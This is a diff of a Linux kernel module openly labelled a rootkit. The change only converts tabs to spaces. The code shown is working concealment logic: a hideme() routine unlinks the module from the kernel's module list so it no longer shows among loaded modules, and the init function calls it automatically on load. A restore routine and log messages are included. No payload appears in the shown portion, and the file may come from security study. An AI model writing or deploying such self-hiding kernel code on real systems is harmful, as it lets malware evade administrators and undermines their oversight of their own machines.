@@ -19,32 +19,32 @@ static short hidden = 0;
 
 void showme(void)
 {
-	/* Add the saved list_head struct back to the module list */
-	list_add(&THIS_MODULE->list, prev_module);
-	hidden = 0;
+    /* Add the saved list_head struct back to the module list */
+    list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
 }
 
 void hideme(void)
 {
-	/* Save the module in the list before us, so we can add ourselves
-	 * back to the list in the same place later. */
-	prev_module = THIS_MODULE->list.prev;
-	/* Remove ourselves from the list module list */
-	list_del(&THIS_MODULE->list);
-	hidden = 1;
+    /* Save the module in the list before us, so we can add ourselves
+     * back to the list in the same place later. */
+    prev_module = THIS_MODULE->list.prev;
+    /* Remove ourselves from the list module list */
+    list_del(&THIS_MODULE->list);
+    hidden = 1;
 }
 
 static int __init rootkit_init(void)
 {
-	printk(KERN_INFO "Rootkit Loaded >:-)\n");
-	hideme();
-	return 0;
+    printk(KERN_INFO "Rootkit Loaded >:-)\n");
+    hideme();
+    return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	/* Note that you won't be able to unload this LKM yet... */
-	printk(KERN_INFO "Goodbye, World!\n");
+    /* Note that you won't be able to unload this LKM yet... */
+    printk(KERN_INFO "Goodbye, World!\n");
 }
 
 module_init(rootkit_init);
